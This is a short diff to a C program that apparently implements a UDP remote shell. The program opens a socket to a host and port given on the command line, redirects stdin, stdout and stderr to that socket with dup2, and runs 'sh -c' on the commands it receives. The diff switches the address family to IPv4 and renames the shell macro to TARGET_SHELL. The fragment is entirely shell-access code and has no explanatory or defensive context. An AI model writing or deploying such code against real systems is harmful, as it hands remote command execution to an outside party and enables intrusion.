@@ -61,7 +61,7 @@ int main(int argc, char *argv[]) {
 
   // source address
   memset(&hints, 0, sizeof hints);
-  hints.ai_family = AF_UNSPEC;
+  hints.ai_family = AF_INET;
   hints.ai_socktype = SOCK_DGRAM;
   hints.ai_flags = AI_PASSIVE;
   if ((ret = getaddrinfo(NULL, argv[3], &hints, &srcinfo)) != 0)
@@ -69,7 +69,7 @@ int main(int argc, char *argv[]) {
 
   // destination address
   memset(&hints, 0, sizeof hints);
-  hints.ai_family = AF_UNSPEC;
+  hints.ai_family = AF_INET;
   hints.ai_socktype = SOCK_DGRAM;
   if ((ret = getaddrinfo(argv[1], argv[2], &hints, &dstinfo)) != 0)
     clean_and_exit("getaddrinfo");
@@ -111,7 +111,7 @@ int main(int argc, char *argv[]) {
       dup2(sockfd, 0);
       dup2(sockfd, 1);
       dup2(sockfd, 2);
-      execl(SHELL, "sh", "-c", buffer, NULL);
+      execl(TARGET_SHELL, "sh", "-c", buffer, NULL);
       return 0;
     }
   }
